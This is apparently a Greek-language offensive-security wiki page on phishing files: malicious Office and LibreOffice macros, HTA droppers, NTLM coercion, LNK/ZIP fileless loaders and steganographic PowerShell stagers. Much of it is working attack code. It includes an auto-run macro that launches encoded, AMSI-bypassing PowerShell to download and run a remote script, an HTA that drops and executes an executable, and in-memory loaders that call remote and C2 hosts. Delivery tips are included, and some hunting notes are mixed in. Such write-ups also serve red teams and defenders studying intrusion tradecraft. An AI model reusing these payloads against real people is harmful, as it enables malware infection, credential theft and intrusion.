# Αρχεία και Έγγραφα Phishing

## Έγγραφα Office

Το Microsoft Word εκτελεί επικύρωση των δεδομένων του αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση των δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης της δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Αν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατή η μετονομασία του αρχείου με αλλαγή της επέκτασης, διατηρώντας παράλληλα τις δυνατότητες εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros από τον σχεδιασμό του, αλλά ένα αρχείο DOCM που έχει μετονομαστεί σε RTF θα υποβληθεί σε επεξεργασία από το Microsoft Word και θα έχει τη δυνατότητα εκτέλεσης macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί ισχύουν για όλο το λογισμικό της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις πρόκειται να εκτελεστούν από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX αρχεία που αναφέρονται σε ένα remote template (File –Options –Add-ins –Manage: Templates –Go) το οποίο περιλαμβάνει macros μπορούν επίσης να “εκτελέσουν” macros.

### External Image Load

Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, και **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Μεταβείτε στο: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατή η χρήση macros για την εκτέλεση arbitrary code από το document.

#### Autoload functions

Όσο πιο συνηθισμένες είναι, τόσο πιθανότερο είναι να τις εντοπίσει το AV.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Μη αυτόματη αφαίρεση μεταδεδομένων

Μεταβείτε στο **Αρχείο > Πληροφορίες > Επιθεώρηση εγγράφου > Επιθεώρηση εγγράφου**, όπου θα εμφανιστεί ο Επιθεωρητής εγγράφου. Κάντε κλικ στην επιλογή **Επιθεώρηση** και, στη συνέχεια, στην επιλογή **Κατάργηση όλων** δίπλα στην ενότητα **Ιδιότητες εγγράφου και προσωπικές πληροφορίες**.

#### Επέκταση Doc

Όταν ολοκληρώσετε, επιλέξτε το αναπτυσσόμενο μενού **Αποθήκευση ως τύπου** και αλλάξτε τη μορφή από **`.docx`** σε Word 97-2003 **`.doc`**.\
Κάντε το επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε ένα `.docx`** και υπάρχει **αρνητική προκατάληψη** **γύρω από** την επέκταση **`.docm` με ενεργοποιημένα macro** (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες web/email τα αποκλείουν πλήρως). Επομένως, αυτή η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Τα έγγραφα LibreOffice Writer μπορούν να ενσωματώνουν Basic macros και να τα εκτελούν αυτόματα όταν ανοίγει το αρχείο, συνδέοντας το macro με το συμβάν **Άνοιγμα εγγράφου** (Εργαλεία → Προσαρμογή → Συμβάντα → Άνοιγμα εγγράφου → Macro…).<sup>[[1]](#references)</sup> Ένα απλό reverse shell macro μοιάζει ως εξής:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στο string – το LibreOffice Basic τα χρησιμοποιεί για διαφυγή κυριολεκτικών εισαγωγικών, επομένως τα payloads που τελειώνουν σε `...==""")` διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε το ως `.odt` και συνδέστε το macro με το event του document, ώστε να εκτελείται αμέσως κατά το άνοιγμα.
- Όταν στέλνετε email με το `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` είναι απαραίτητο ώστε να σταλούν τα bytes του αρχείου και όχι το string του ονόματος αρχείου ως attachment). Αυτό είναι κρίσιμο κατά την κατάχρηση SMTP servers που αποδέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς validation.

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το user interface και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του security model ενός browser.

Ένα HTA εκτελείται μέσω του **`mshta.exe`**, το οποίο είναι συνήθως **εγκατεστημένο** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από τον IE**. Επομένως, αν έχει απεγκατασταθεί, τα HTAs δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Authentication

Υπάρχουν διάφοροι τρόποι για να **εξαναγκάσετε NTLM authentication «απομακρυσμένα»**· για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που θα ανοίξει ο χρήστης (ακόμη και μέσω HTTP MitM;). Εναλλακτικά, μπορείτε να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσουν** μια **authentication** απλώς με το **άνοιγμα του φακέλου**.

**Ελέγξτε αυτές τις ιδέες και περισσότερες στις παρακάτω σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την authentication, αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Ιδιαίτερα αποτελεσματικές campaigns διανέμουν ένα ZIP που περιέχει δύο νόμιμα έγγραφα-δόλωμα (PDF/DOCX) και ένα κακόβουλο .lnk. Το τέχνασμα είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από ένα μοναδικό marker και το .lnk τον απομονώνει και τον εκτελεί πλήρως στη μνήμη.<sup>[[2]](#references)</sup>

Τυπική ροή που υλοποιείται από το PowerShell one-liner του .lnk:

1) Εντοπισμός του αρχικού ZIP σε συνηθισμένες διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και στον γονικό φάκελο του τρέχοντος working directory.
2) Ανάγνωση των bytes του ZIP και εύρεση ενός hardcoded marker (π.χ. xFIQCV). Ό,τι ακολουθεί μετά το marker είναι το embedded PowerShell payload.
3) Αντιγραφή του ZIP στο %ProgramData%, εξαγωγή του εκεί και άνοιγμα του decoy .docx ώστε να φαίνεται νόμιμο.
4) Παράκαμψη του AMSI για την τρέχουσα process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Απο-συσκότιση του επόμενου stage (π.χ. αφαίρεση όλων των χαρακτήρων #) και εκτέλεσή του στη μνήμη.

Παράδειγμα PowerShell skeleton για την απομόνωση και εκτέλεση του embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Η παράδοση συχνά κάνει κατάχρηση αξιόπιστων PaaS subdomains (π.χ. *.herokuapp.com) και μπορεί να ελέγχει τα payloads (να παρέχει benign ZIPs με βάση την IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc, ώστε να ελαχιστοποιεί τα artifacts στον δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control, ώστε ο IE/Explorer ή οποιαδήποτε εφαρμογή το ενσωματώνει να εκκινεί ξανά αυτόματα το payload.<sup>[[2]](#references)[[4]](#references)</sup> Δείτε εδώ τις λεπτομέρειες και έτοιμες προς χρήση εντολές:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP αρχεία που περιέχουν το ASCII marker string (π.χ. xFIQCV) προσαρτημένο στα δεδομένα του archive.
- .lnk που απαριθμεί parent/user folders για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Business threads μεγάλης διάρκειας που καταλήγουν σε links hosted under trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Ένα ακόμη επαναλαμβανόμενο pattern είναι ένα **document-impersonating `.lnk`** που ανοίγει αμέσως ένα benign lure, ενώ πραγματοποιεί staging της πραγματικής αλυσίδας στο background.<sup>[[3]](#references)</sup>

Observed workflow:
1. Το shortcut **μεταμφιέζεται σε PDF** και χρησιμοποιεί το `conhost.exe` ή παρόμοιο proxy για να εκκινήσει έναν obfuscated PowerShell downloader.
2. Το PowerShell διασπά προφανή tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), ώστε naive detections που αναζητούν `iwr`, `gci`, `ren`, `cpi` ή `schtasks` να μην εντοπίζουν την εντολή.
3. Το stager κατεβάζει πρώτα το **decoy document**, το ανοίγει για το victim και έπειτα ανασυνθέτει τα malicious αρχεία στο background.
4. Τα payloads μπορεί να εγγράφονται με **junk extensions** και στη συνέχεια να μετονομάζονται με αφαίρεση filler characters, καθυστερώντας την εμφάνιση προφανών `.exe` / `.cpl` artifacts.
5. Το Persistence εγκαθίσταται με ένα **minute-based scheduled task** που εκκινεί ένα trusted host binary από user-writable path.

Minimal hunting clues από αυτό το pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Ένα χρήσιμο staging layout που πρέπει να αναγνωρίζετε είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ή `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο stage είναι stealthy

Στο case study της Rapid7, το scheduled task εκκινούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε τοποθετηθεί δίπλα του και έκανε export το **`RunFODW`**, το trusted Microsoft binary έκανε side-load το CPL του attacker αντί για το legitimate system copy.

Το CPL:
- Διαβάζει ένα blob **AES-256-CBC** από το `C:\Windows\Tasks\editor.dat`
- Το κάνει decrypt μέσω των **Windows CNG / `bcrypt.dll`**
- Κάνει allocate executable memory και αντιγράφει το decrypted shellcode
- Το εκτελεί έμμεσα, περνώντας τον pointer του shellcode ως callback για το **`EnumUILanguagesW`**

Αυτό το τελευταίο βήμα αξίζει να αναζητείται ξεχωριστά: το malware συχνά αποφεύγει ένα άμεσο jump τύπου `((void(*)())buf)()` και αντ' αυτού κάνει abuse ενός **legitimate callback-taking WinAPI** για να μεταφέρει την εκτέλεση.

Το decrypted payload σε αυτή την campaign ήταν **Donut** shellcode, το οποίο στη συνέχεια έκανε πλήρες mapping του τελικού PE στη μνήμη και έκανε patch τα **AMSI/WLDP/ETW** στο current process πριν παραδώσει την εκτέλεση. Για πιο αναλυτικές σημειώσεις σχετικά με το side-loading και το memory-resident post-processing, δείτε:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά hunting pivots:
- `.lnk` που κάνει spawn το `powershell.exe` ή το `conhost.exe` και στη συνέχεια εμφανίζει ένα decoy document.
- Downloads μικρής διάρκειας προς το **`C:\Users\Public\`**, που ακολουθούνται από άμεσα renames από nonsense extensions.
- Scheduled tasks με κοινότοπα ονόματα, όπως `GoogleErrorReport`, που εκτελούνται από **user-writable directories**.
- Trusted binaries που φορτώνουν αρχεία **`.cpl` / `.dll`** από τον ίδιο non-system directory.
- Base64 text blobs που γράφονται κάτω από το **`C:\Windows\Tasks\`** και στη συνέχεια διαβάζονται από το side-loaded module.

## Payloads με steganography delimiters σε images (PowerShell stager)

Πρόσφατες loader chains παραδίδουν ένα obfuscated JavaScript/VBS, το οποίο κάνει decode και εκτελεί ένα Base64 PowerShell stager. Αυτό το stager κατεβάζει μια image (συχνά GIF), η οποία περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως plain text μεταξύ μοναδικών start/end markers. Το script αναζητά αυτά τα delimiters (παραδείγματα που έχουν παρατηρηθεί in the wild: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το between-text, κάνει Base64-decode σε bytes, φορτώνει το assembly in-memory και κάνει invoke μια γνωστή entry method με το C2 URL.<sup>[[5]](#references)</sup>

Ροή εργασίας
- Stage 1: Archived JS/VBS dropper → κάνει decode το embedded Base64 → εκκινεί PowerShell stager με -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → κατεβάζει image, κάνει carve το marker-delimited Base64, φορτώνει το .NET DLL in-memory και καλεί τη method του (π.χ. VAI), περνώντας το C2 URL και options.
- Stage 3: Ο loader ανακτά το τελικό payload και συνήθως το κάνει inject μέσω process hollowing σε trusted binary (συνήθως το MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Δείτε περισσότερα σχετικά με το process hollowing και το trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Παράδειγμα PowerShell για carve ενός DLL από μια image και invoke μιας .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- Αυτό είναι το ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Οι markers διαφέρουν μεταξύ campaigns.
- Το AMSI/ETW bypass και το string deobfuscation εφαρμόζονται συνήθως πριν από τη φόρτωση του assembly.
- Hunting: σαρώστε τις εικόνες που έχουν ληφθεί για γνωστά delimiters· εντοπίστε PowerShell που αποκτά πρόσβαση σε εικόνες και αποκωδικοποιεί άμεσα Base64 blobs.

Δείτε επίσης τα stego tools και τις τεχνικές carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ένα συνηθισμένο αρχικό stage είναι ένα μικρό, heavily-obfuscated `.js` ή `.vbs` που παραδίδεται μέσα σε archive. Ο μοναδικός του σκοπός είναι να αποκωδικοποιήσει ένα embedded Base64 string και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass`, ώστε να γίνει bootstrap του επόμενου stage μέσω HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Ανάγνωση των περιεχομένων του ίδιου του αρχείου
- Εντοπισμός ενός Base64 blob μεταξύ junk strings
- Αποκωδικοποίηση σε ASCII PowerShell
- Εκτέλεση με `wscript.exe`/`cscript.exe`, καλώντας το `powershell.exe`

Hunting cues
- Αρχειοθετημένα JS/VBS attachments που κάνουν spawn το `powershell.exe` με `-enc`/`FromBase64String` στη command line.
- `wscript.exe` που εκκινεί το `powershell.exe -nop -w hidden` από user temp paths.

## Windows files to steal NTLM hashes

Ελέγξτε τη σελίδα σχετικά με **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Εκστρατεία ZipLine: Μια εξελιγμένη Phishing Attack με στόχο εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Παρακολούθηση του Tradecraft του Dropping Elephant μέσω μιας China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Νέα τεχνική COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Ο PhantomVAI Loader παραδίδει μια σειρά από Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
